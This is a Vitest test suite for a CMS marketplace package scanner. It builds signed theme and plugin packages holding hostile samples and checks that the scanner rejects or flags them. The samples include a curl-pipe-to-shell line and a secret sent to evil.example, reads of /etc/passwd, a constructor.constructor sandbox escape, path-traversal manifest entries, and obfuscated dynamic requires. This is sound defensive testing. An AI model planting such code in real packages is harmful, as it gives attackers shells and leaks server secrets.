import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import {
  buildPackage,
  generateKeyPair,
  packDirectory,
  sha256,
  signChecksum,
  wrap,
  type PackageEnvelope,
  type PackageKind,
  type PackageManifest,
} from "@zcmsorg/package";
import { afterEach, describe, expect, it } from "vitest";
import { scanPackage } from "../scan";
import type { Finding, ScanReport } from "../types";

/**
 * Every package in this file is a REAL .zcms: built from a real directory on a
 * real filesystem, tarred, gzipped, signed and then handed to the scanner as
 * bytes — the same path an uploaded package takes. Nothing is mocked, because a
 * scanner that only rejects a hand-made object graph tells us nothing about what
 * it does with an attacker's tarball.
 */

const tempDirs: string[] = [];

function tempDir(): string {
  const dir = fs.mkdtempSync(path.join(fs.realpathSync(os.tmpdir()), "zcms-scan-test-"));
  tempDirs.push(dir);
  return dir;
}

afterEach(() => {
  for (const dir of tempDirs.splice(0)) fs.rmSync(dir, { recursive: true, force: true });
});

function writeTree(dir: string, files: Record<string, string>): void {
  for (const [rel, content] of Object.entries(files)) {
    const abs = path.join(dir, rel);
    fs.mkdirSync(path.dirname(abs), { recursive: true });
    fs.writeFileSync(abs, content);
  }
}

function manifestFor(kind: PackageKind, overrides: Record<string, unknown>): PackageManifest {
  return {
    id: kind === "theme" ? "vn.zsoft.theme.corporate" : "vn.zsoft.plugin.seo",
    name: "Corporate",
    version: "1.0.0",
    kind,
    author: { name: "Z-SOFT" },
    engine: ">=0.1.0",
    entry: "dist/index.js",
    ...overrides,
  } as PackageManifest;
}

/**
 * Builds a signed package the same way `zcms pack` does — including the manifest
 * checks buildPackage() itself performs.
 */
async function buildZcms(
  files: Record<string, string>,
  options: { kind?: PackageKind; manifest?: Record<string, unknown> } = {},
): Promise<Buffer> {
  const kind = options.kind ?? "theme";
  const dir = tempDir();

  writeTree(dir, files);
  writeTree(dir, {
    [kind === "theme" ? "theme.json" : "plugin.json"]: JSON.stringify(
      manifestFor(kind, options.manifest ?? {}),
      null,
      2,
    ),
  });

  const publisher = generateKeyPair();
  const { file } = await buildPackage(dir, kind, publisher.privateKey, publisher.publicKey);
  return file;
}

/**
 * Builds a package whose ENVELOPE the publisher controls directly.
 *
 * An attacker does not have to use our packing tool: they can write the envelope
 * by hand, which is the only way to ship a manifest buildPackage() would refuse
 * (an entry pointing outside the package, say). The scanner is the thing that has
 * to catch it, so the tests must be able to produce it.
 */
async function forgeZcms(
  files: Record<string, string>,
  manifest: PackageManifest,
): Promise<Buffer> {
  const dir = tempDir();
  writeTree(dir, files);

  const payload = await packDirectory(dir);
  const checksum = sha256(payload);
  const publisher = generateKeyPair();

  const envelope: PackageEnvelope = {
    checksum,
    manifest,
    publisherSignature: signChecksum(checksum, publisher.privateKey),
    publisherKey: publisher.publicKey,
  };

  return wrap(envelope, payload);
}

const CLEAN_THEME = `
import React from "react";

export default function Layout({ children, posts }) {
  const sorted = [...posts].sort((a, b) => b.date - a.date);
  return <main>{children}{sorted.map((p) => <article key={p.id}>{p.title}</article>)}</main>;
}
`;

function rules(report: ScanReport): string[] {
  return report.findings.map((f) => f.rule);
}

function finding(report: ScanReport, rule: string): Finding {
  const found = report.findings.find((f) => f.rule === rule);
  if (!found) throw new Error(`No "${rule}" finding. Got: ${rules(report).join(", ")}`);
  return found;
}

describe("scanPackage", () => {
  it("passes a clean theme with no findings at all", async () => {
    // The baseline. If ordinary code does not pass, nothing else about the
    // scanner matters — it would be turned off within a week.
    const file = await buildZcms({ "dist/index.js": CLEAN_THEME });

    const report = await scanPackage(file);

    expect(report.verdict).toBe("pass");
    expect(report.findings).toEqual([]);
    expect(report.summary).toEqual({ block: 0, warn: 0, info: 0 });
    expect(report.scannedFiles).toContain("dist/index.js");
  });

  it("rejects a package that imports child_process", async () => {
    // ATTACK: a theme is imported straight into the site-runtime Node process, so
    // one `require("child_process")` in it is a shell on the server.
    const file = await buildZcms({
      "dist/index.js": [
        'const { execSync } = require("child_process");',
        'execSync("curl https://evil.example/x.sh | sh");',
        "export default function Layout() { return null; }",
      ].join("\n"),
    });

    const report = await scanPackage(file);

    expect(report.verdict).toBe("reject");
    expect(finding(report, "node-builtin:child_process").severity).toBe("block");
    expect(finding(report, "node-builtin:child_process").file).toBe("dist/index.js");
    expect(finding(report, "node-builtin:child_process").line).toBe(1);
    expect(finding(report, "process:spawn").severity).toBe("block");
  });

  it("rejects a package that reaches Function through constructor.constructor", async () => {
    // ATTACK: the classic vm/isolate escape. A plugin isolate has no `Function`
    // and no `require`, but `({}).constructor.constructor` IS Function, and from
    // there the host realm's `process` is one string away.
    const file = await buildZcms({
      "dist/index.js": [
        "export function onInit(ctx) {",
        '  const F = ({}).constructor.constructor("return process");',
        "  F().exit(0);",
        "}",
      ].join("\n"),
    });

    const report = await scanPackage(file);

    expect(report.verdict).toBe("reject");
    expect(finding(report, "constructor-escape").severity).toBe("block");
    expect(finding(report, "constructor-escape").line).toBe(2);
  });

  it("rejects a package that imports fs", async () => {
    // A theme reading the filesystem can read .env, the Prisma schema, the
    // marketplace private key — everything the server process can read.
    const file = await buildZcms({
      "dist/index.js": 'import { readFileSync } from "node:fs";\nexport const secret = readFileSync("/etc/passwd");',
    });

    const report = await scanPackage(file);

    expect(report.verdict).toBe("reject");
    expect(finding(report, "node-builtin:fs").severity).toBe("block");
  });

  it("flags, but does not reject, a package that only calls fetch()", async () => {
    // fetch() is suspicious in a theme, not proven hostile — an analytics widget
    // does it too. `flag` means quarantine for a human, which is the right answer;
    // rejecting here would make the scanner a nuisance instead of a gate.
    const file = await buildZcms({
      "dist/index.js": 'export async function load() { return fetch("https://api.example/posts"); }',
    });

    const report = await scanPackage(file);

    expect(report.verdict).toBe("flag");
    expect(finding(report, "network-fetch").severity).toBe("warn");
    expect(report.summary.block).toBe(0);
    expect(report.summary.warn).toBe(1);
  });

  it("warns that a file with a 2000-character line is minified beyond review", async () => {
    // Minification is not malware, but nobody can review it — and hiding a payload
    // inside a bundle "everyone minifies anyway" is exactly the play. A human looks.
    const longLine = "const a = 1; ".repeat(200); // ~2600 chars, one line
    expect(longLine.length).toBeGreaterThan(2000);

    const file = await buildZcms({ "dist/index.js": `${longLine}\nexport default () => null;` });

    const report = await scanPackage(file);

    expect(report.verdict).toBe("flag");
    expect(finding(report, "minified").severity).toBe("warn");
    expect(finding(report, "minified").line).toBe(1);
  });

  it("warns about a large base64 blob embedded in a source file", async () => {
    // Where a payload hides when the imports look clean.
    const blob = "QUJDRA".repeat(120); // ~720 contiguous base64 chars, no newline
    const file = await buildZcms({
      "dist/index.js": `export const ASSET = "${blob}";`,
    });

    const report = await scanPackage(file);

    expect(report.verdict).toBe("flag");
    expect(finding(report, "embedded-blob").severity).toBe("warn");
    expect(rules(report)).not.toContain("minified"); // the line is short; only the blob is the finding
  });

  it("warns when a package contains no source files it could inspect", async () => {
    // A "pass" here would be a lie: the scanner did not clear the package, it
    // never looked at it. Say so, and let a human decide.
    const file = await buildZcms(
      { "dist/theme.css": "body { color: red; }" },
      { manifest: { entry: "dist/theme.css" } },
    );

    const report = await scanPackage(file);

    expect(report.verdict).toBe("flag");
    expect(finding(report, "no-code").severity).toBe("warn");
    expect(report.scannedFiles).toEqual([]);
  });

  it("does not scan files that are not code, so a code sample in a README passes", async () => {
    // Documentation is not executed. If prose tripped the rules, every honest
    // package with an example in its README would be rejected.
    const file = await buildZcms({
      "dist/index.js": CLEAN_THEME,
      "README.md": 'Do not do this:\n\n    const cp = require("child_process");\n',
    });

    const report = await scanPackage(file);

    expect(report.verdict).toBe("pass");
    expect(report.scannedFiles).toEqual(["dist/index.js"]);
  });

  describe("manifest checks", () => {
    it("blocks a manifest whose entry escapes the package with ..", async () => {
      // ATTACK: entry "../../../../etc/cron.d/x" — the loader is asked to import a
      // file outside the unpacked package. buildPackage() would refuse to produce
      // this, so the attacker writes the envelope themselves; the scanner is the
      // backstop that must still see it.
      const file = await forgeZcms(
        { "dist/index.js": CLEAN_THEME },
        manifestFor("theme", { entry: "../../../../etc/passwd" }),
      );

      const report = await scanPackage(file);

      expect(report.verdict).toBe("reject");
      expect(finding(report, "manifest-entry").severity).toBe("block");
      expect(finding(report, "manifest-entry").file).toBe("theme.json");
    });

    it("blocks a manifest whose entry is an absolute path", async () => {
      const file = await forgeZcms(
        { "dist/index.js": CLEAN_THEME },
        manifestFor("theme", { entry: "/etc/passwd" }),
      );

      const report = await scanPackage(file);

      expect(report.verdict).toBe("reject");
      expect(finding(report, "manifest-entry").severity).toBe("block");
    });

    it("blocks a plugin that declares a table outside its own prefix", async () => {
      // ATTACK: a plugin declaring the `users` table would be handed write access
      // to the platform's own data at install time.
      const file = await buildZcms(
        { "dist/index.js": "export function onInit() {}" },
        {
          kind: "plugin",
          manifest: {
            id: "vn.zsoft.plugin.seo",
            database: { tables: ["users"] },
          },
        },
      );

      const report = await scanPackage(file);

      expect(report.verdict).toBe("reject");
      expect(finding(report, "manifest-table").severity).toBe("block");
      expect(finding(report, "manifest-table").message).toContain("plugin_vn_zsoft_plugin_seo_");
      expect(finding(report, "manifest-table").file).toBe("plugin.json");
    });

    it("accepts a plugin whose tables stay inside its own prefix", async () => {
      // The other half of the rule: plugins are allowed their own tables, and a
      // check that rejected those would make the feature unusable.
      const file = await buildZcms(
        { "dist/index.js": "export function onInit() {}" },
        {
          kind: "plugin",
          manifest: {
            id: "vn.zsoft.plugin.seo",
            database: {
              tables: ["plugin_vn_zsoft_plugin_seo_redirects", "plugin_vn_zsoft_plugin_seo_meta"],
            },
          },
        },
      );

      const report = await scanPackage(file);

      expect(report.verdict).toBe("pass");
      expect(rules(report)).not.toContain("manifest-table");
    });

    it("blocks a plugin whose table name only pretends to carry the prefix", async () => {
      // ATTACK: "plugin_vn_zsoft_plugin_seo" without the trailing underscore, or a
      // prefix belonging to a DIFFERENT plugin — both are outside this plugin's
      // namespace and must not be granted.
      const file = await buildZcms(
        { "dist/index.js": "export function onInit() {}" },
        {
          kind: "plugin",
          manifest: {
            id: "vn.zsoft.plugin.seo",
            database: { tables: ["plugin_vn_zsoft_plugin_analytics_events"] },
          },
        },
      );

      const report = await scanPackage(file);

      expect(report.verdict).toBe("reject");
      expect(finding(report, "manifest-table").severity).toBe("block");
    });
  });

  it("blocks a package that unpacks to more than the caller's size limit", async () => {
    // Defence in depth over the loader's own cap: a package that unpacks to a
    // gigabyte is either a bomb or a mistake, and neither should be signed.
    const file = await buildZcms({ "dist/index.js": CLEAN_THEME });

    const report = await scanPackage(file, { maxUnpackedBytes: 10 });

    expect(report.verdict).toBe("reject");
    expect(finding(report, "size").severity).toBe("block");
    expect(finding(report, "size").file).toBe("(package)");
  });

  it("stays under a generous size limit that a normal package does not approach", async () => {
    const file = await buildZcms({ "dist/index.js": CLEAN_THEME });

    const report = await scanPackage(file, { maxUnpackedBytes: 5 * 1024 * 1024 });

    expect(rules(report)).not.toContain("size");
  });

  it("NEVER EXECUTES the code it scans", async () => {
    // THE SAFETY PROPERTY THIS WHOLE FILE EXISTS FOR. The scanner runs on the
    // marketplace's own servers, on packages uploaded by strangers. If scanning a
    // package could run it, the scanner would be a remote code execution service
    // for anyone who can click Upload — a far worse hole than any it detects.
    //
    // The canary: an entry file that writes to a path on import. After the scan,
    // that path must not exist.
    const canaryDir = tempDir();
    const canary = path.join(canaryDir, "PWNED");

    const file = await buildZcms({
      "dist/index.js": [
        'const fs = require("node:fs");',
        `fs.writeFileSync(${JSON.stringify(canary)}, "the scanner ran me");`,
        'throw new Error("and this would have crashed the scanner");',
      ].join("\n"),
    });

    const report = await scanPackage(file);

    expect(fs.existsSync(canary)).toBe(false); // it was READ, not RUN
    expect(report.verdict).toBe("reject"); // and it was read well enough to reject
    expect(finding(report, "node-builtin:fs").severity).toBe("block");
  });

  it("reports one finding per rule per file, not one per occurrence", async () => {
    // A minified bundle can contain a thousand `eval(`s. A thousand findings is
    // not a thousand times the signal — it is a report no human reads.
    const file = await buildZcms({
      "dist/index.js": ["eval(a);", "eval(b);", "eval(c);"].join("\n"),
    });

    const report = await scanPackage(file);

    expect(rules(report).filter((r) => r === "eval")).toEqual(["eval"]);
    expect(finding(report, "eval").line).toBe(1); // reported at its first occurrence
  });

  it("reports the same rule once for each file that breaks it", async () => {
    // Per FILE, not per package: a reviewer must see every file that is dirty.
    const file = await buildZcms({
      "dist/index.js": "eval(a);",
      "dist/widget.mjs": "eval(b);",
    });

    const report = await scanPackage(file);

    const evalFiles = report.findings.filter((f) => f.rule === "eval").map((f) => f.file);
    expect(evalFiles.sort()).toEqual(["dist/index.js", "dist/widget.mjs"]);
  });

  it("sorts findings most-severe-first and counts them correctly", async () => {
    // A caller that logs or shows only the first finding must be shown the worst
    // one. If a warn sorted above a block, the summary line of a rejected package
    // would read "reads process.env".
    const file = await buildZcms({
      "dist/index.js": [
        "const key = process.env.SECRET;", // warn: process-env
        'fetch("https://evil.example", { body: key });', // warn: network-fetch
        'const cp = require("child_process");', // block: node-builtin:child_process
      ].join("\n"),
    });

    const report = await scanPackage(file);

    expect(report.verdict).toBe("reject");
    expect(report.findings[0]!.severity).toBe("block");
    expect(report.summary.block).toBe(1);
    expect(report.summary.warn).toBe(2);
    expect(report.summary.info).toBe(0);
    expect(report.summary.block + report.summary.warn).toBe(report.findings.length);

    const order = { block: 0, warn: 1, info: 2 } as const;
    const ranks = report.findings.map((f) => order[f.severity]);
    expect([...ranks].sort((a, b) => a - b)).toEqual(ranks); // non-decreasing
  });

  it("attaches the offending line and a trimmed excerpt to a finding", async () => {
    // The excerpt is what a reviewer reads. It must point at the actual line, and
    // it must not paste a 2000-character minified line into the report.
    const file = await buildZcms({
      "dist/index.js": ["// harmless", `const x = "${"y".repeat(400)}"; eval(x);`].join("\n"),
    });

    const report = await scanPackage(file);
    const hit = finding(report, "eval");

    expect(hit.line).toBe(2);
    expect(hit.excerpt!.length).toBeLessThanOrEqual(120);
  });

  it("scans every code extension a bundle can ship, not just .js", async () => {
    // .mjs/.cjs/.ts/.jsx/.tsx are all loadable. A rule that only looked at .js
    // would be bypassed by renaming the file.
    const hostile = 'const cp = require("child_process");';
    const file = await buildZcms({
      "dist/index.js": CLEAN_THEME,
      "dist/a.mjs": hostile,
      "dist/b.cjs": hostile,
      "dist/c.jsx": hostile,
      "dist/d.tsx": hostile,
    });

    const report = await scanPackage(file);

    expect(report.verdict).toBe("reject");
    const dirty = report.findings
      .filter((f) => f.rule === "node-builtin:child_process")
      .map((f) => f.file)
      .sort();
    expect(dirty).toEqual(["dist/a.mjs", "dist/b.cjs", "dist/c.jsx", "dist/d.tsx"]);
  });

  it("rejects a package that hides its import behind a computed require and a blob", async () => {
    // A realistic obfuscated dropper: the module name never appears as a literal,
    // so no module rule fires. The scanner still catches it — because HIDING is
    // itself the finding (dynamic-require + embedded-blob + eval).
    const blob = "cmVxdWlyZQ".repeat(70); // >600 contiguous base64 chars
    const file = await buildZcms({
      "dist/index.js": [
        `const B = "${blob}";`,
        "const name = atob(B);",
        "const mod = require(name);",
        "eval(mod.payload);",
      ].join("\n"),
    });

    const report = await scanPackage(file);

    expect(report.verdict).toBe("reject"); // eval is a block
    expect(rules(report)).toContain("dynamic-require");
    expect(rules(report)).toContain("deobfuscation");
    expect(rules(report)).toContain("embedded-blob");
  });

  it("leaves no temp directory behind after a scan", async () => {
    // The scanner unpacks hostile bundles to disk. Leaking those directories on a
    // busy marketplace fills the volume — and leaves attacker files lying around.
    // The scanner's staging dirs are "zcms-scan-<rand>"; this suite's own dirs are
    // "zcms-scan-test-<rand>", so exclude those to count only the scanner's.
    const scannerDirs = () =>
      fs
        .readdirSync(fs.realpathSync(os.tmpdir()))
        .filter((n) => n.startsWith("zcms-scan-") && !n.startsWith("zcms-scan-test-")).length;
    const before = scannerDirs();

    await scanPackage(await buildZcms({ "dist/index.js": CLEAN_THEME }));

    expect(scannerDirs()).toBeLessThanOrEqual(before);
  });
});

/**
 * The structural (AST) pass. Everything here is a bypass of the TEXT rules —
 * the literal string the regex looks for never appears — so it proves the parse
 * tree catches what line-matching structurally cannot.
 */
describe("scanPackage — structural (AST) pass", () => {
  it("rejects child_process reached through a concatenated string", async () => {
    // ATTACK: the exact bypass the regex `dynamic-require` rule cannot see — the
    // literal "child_process" is never on any line, it is assembled at runtime.
    const file = await buildZcms({
      "dist/index.js": [
        'const cp = require("child" + "_process");',
        "export default function Layout() { return null; }",
      ].join("\n"),
    });

    const report = await scanPackage(file);

    expect(report.verdict).toBe("reject");
    expect(finding(report, "dangerous-module-computed").severity).toBe("block");
    expect(finding(report, "dangerous-module-computed").line).toBe(1);
    // The literal module rule must NOT have fired — proving this is the AST pass.
    expect(rules(report)).not.toContain("node-builtin:child_process");
  });

  it("rejects a dynamic import() of a concatenated builtin", async () => {
    const file = await buildZcms({
      "dist/index.js": 'export async function boot() { return import("n" + "et"); }',
    });

    const report = await scanPackage(file);

    expect(report.verdict).toBe("reject");
    expect(finding(report, "dangerous-module-computed").severity).toBe("block");
  });

  it("blocks monkey-patching a shared host global", async () => {
    // ATTACK: in the render process every tenant shares, replacing globalThis.fetch
    // lets a theme observe or rewrite requests made while OTHER sites render.
    const file = await buildZcms({
      "dist/index.js": [
        "const realFetch = globalThis.fetch;",
        "globalThis.fetch = async (...a) => realFetch(...a);",
        "export default function Layout() { return null; }",
      ].join("\n"),
    });

    const report = await scanPackage(file);

    expect(report.verdict).toBe("reject");
    expect(finding(report, "monkeypatch-sensitive-global").severity).toBe("block");
    expect(finding(report, "monkeypatch-sensitive-global").line).toBe(2);
  });

  it("flags computed access to process, past the process.env text rule", async () => {
    const file = await buildZcms({
      "dist/index.js": 'export const k = process["e" + "nv"]["DATABASE_URL"];',
    });

    const report = await scanPackage(file);

    expect(report.verdict).toBe("flag");
    expect(finding(report, "process-computed-access").severity).toBe("warn");
    // The text `process.env` rule cannot see `process["e"+"nv"]`.
    expect(rules(report)).not.toContain("process-env");
  });

  it("leaves ordinary JavaScript untouched (no false positives)", async () => {
    // The counterweight: real theme logic — property access, local assignment,
    // literal string keys — must not trip any structural rule.
    const file = await buildZcms({
      "dist/index.js": [
        "export default function Layout({ posts, settings }) {",
        "  const opts = {};",
        '  opts["title"] = settings.title;',
        "  const sorted = [...posts].sort((a, b) => b.date - a.date);",
        '  return sorted.map((p) => p.title).join(", ") + opts.title;',
        "}",
      ].join("\n"),
    });

    const report = await scanPackage(file);

    expect(report.verdict).toBe("pass");
    expect(report.findings).toEqual([]);
  });

  it("does not crash on an unparseable file — regex + heuristics still apply", async () => {
    // A file the parser chokes on must fall back to the text rules, never throw.
    const file = await buildZcms({
      "dist/index.js": 'const broken = (( ;\nconst { execSync } = require("child_process");',
    });

    const report = await scanPackage(file);

    // Unparseable → AST pass yields nothing, but the regex still catches the literal.
    expect(report.verdict).toBe("reject");
    expect(rules(report)).toContain("node-builtin:child_process");
  });
});
